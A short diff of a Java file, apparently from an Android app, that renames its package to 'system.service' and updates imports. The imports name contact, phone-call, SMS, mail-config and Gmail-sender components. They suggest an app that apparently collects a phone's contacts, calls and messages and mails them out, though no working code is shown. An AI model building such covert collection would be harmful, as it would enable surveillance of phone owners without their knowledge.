@@ -1,4 +1,4 @@
-package com.system;
+package system.service;
 
 import java.io.DataOutputStream;
 import java.io.File;
@@ -9,15 +9,15 @@ import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
 
-import com.system.activity.GlobalPrefActivity;
-import com.system.config.ConfigCtrl;
-import com.system.config.MailCfg;
-import com.system.feature.contact.ContactCtrl;
-import com.system.feature.contact.ContactInfo;
-import com.system.feature.phonecall.PhoneCallCtrl;
-import com.system.feature.phonecall.PhoneCallInfo;
-import com.system.feature.sms.SmsCtrl;
-import com.system.feature.sms.SmsInfo;
+import system.service.activity.GlobalPrefActivity;
+import system.service.config.ConfigCtrl;
+import system.service.config.MailCfg;
+import system.service.feature.contact.ContactCtrl;
+import system.service.feature.contact.ContactInfo;
+import system.service.feature.phonecall.PhoneCallCtrl;
+import system.service.feature.phonecall.PhoneCallInfo;
+import system.service.feature.sms.SmsCtrl;
+import system.service.feature.sms.SmsInfo;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.mail.GMailSenderEx;
